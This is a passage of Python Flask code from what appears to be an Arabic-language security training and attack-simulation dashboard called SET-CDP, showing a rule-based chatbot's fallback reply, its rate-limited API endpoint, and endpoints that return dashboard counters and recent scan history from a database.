                "3. افتح المنفذ 5000 محلياً وسجل دخولك ببيانات الأدمن لفتح وحدات الهجوم والمراقبة."
            ),
            "run"
        )

    # =====================================================
    # Fallback (Unknown Command)
    # =====================================================
    return make_reply(
        (
            "[CMD_UNKNOWN] الأمر غير واضح. هل تبحث عن بيانات حول أدوات الاستطلاع (Recon)، "
            "أدوات المحاكاة الهجومية (Payloads)، المراقبة (SOC)، أم قاعدة التهديدات الاستخباراتية (Threat Intel)؟"
        ),
        "fallback",
        suggestions=[
            "كيف أنفذ هجوم استنساخ؟",
            "كيف أستطلع النطاقات؟",
            "كيف أشغل Endpoint Agent؟"
        ]
    )

@app.route("/api/chatbot", methods=["POST"])
def api_chatbot():
    try:
        client_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "local").split(",")[0].strip()

        if is_rate_limited(client_ip):
            return jsonify(make_reply(
                "[SYS_WARN] تم رصد معدل استعلامات مفرط (Rate Limit Exceeded). يرجى التريث قبل إرسال طلب جديد.",
                "rate_limit"
            )), 429

        data = request.get_json(silent=True) or {}
        message = str(data.get("message", "")).strip()

        # حد أقصى لحجم السؤال للحماية (Buffer Limit)
        if len(message) > 1000:
            return jsonify(make_reply(
                "[SYS_ERROR] الإدخال يتجاوز الحد الأقصى للمخزن المؤقت (Buffer Limit). يرجى اختصار الأمر.",
                "limit"
            )), 400

        result = chatbot_reply(message)
        return jsonify(result)

    except Exception as e:
        return jsonify(make_reply(
            "[SYS_CRITICAL] فشل في معالجة الأمر داخل وحدة الذكاء الاصطناعي. أعد المحاولة.",
            "error"
        )), 500
# ============================================================
# SET-CDP Dashboard Counters API
# نفس أرقام لوحة التحكم + سجل النشاط من قاعدة البيانات
# ============================================================

@app.route("/api/get-stats")
def api_get_stats():
    try:
        return jsonify(get_dashboard_counts())
    except Exception as e:
        return jsonify({
            "captures": 0,
            "training": 0,
            "clones": 0,
            "scans": 0,
            "tools": 10,
            "users": 0,
            "quiz": 0,
            "error": str(e)
        }), 500


@app.route("/api/scans/recent")
def api_scans_recent():
    try:
        user_id = session.get("user_id")
        is_admin = session.get("role") == "admin" or session.get("is_admin") is True

        if not user_id:
            return jsonify({"scans": [], "is_admin": False})

        conn = get_db()
        try:
            if is_admin:
                rows = conn.execute("""
                    SELECT scan_history.*, users.username AS owner_username
                    FROM scan_history
                    LEFT JOIN users ON scan_history.user_id = users.id
                    ORDER BY scan_history.id DESC LIMIT 15
                """).fetchall()
            else:
                rows = conn.execute("""
                    SELECT *
                    FROM scan_history
                    WHERE user_id = ?
                    ORDER BY id DESC LIMIT 15
                """, (user_id,)).fetchall()

            scans = [dict(row) for row in rows]
            return jsonify({"scans": scans, "is_admin": bool(is_admin)})
        finally:
            conn.close()

    except Exception as e:
        return jsonify({"scans": [], "is_admin": False, "error": str(e)}), 500

# ==================== MAIN EXECUTION ====================
if __name__ == '__main__':
    print('SET-CDP running at http://127.0.0.1:5000')
    app.run(debug=True, host='127.0.0.1', port=5000)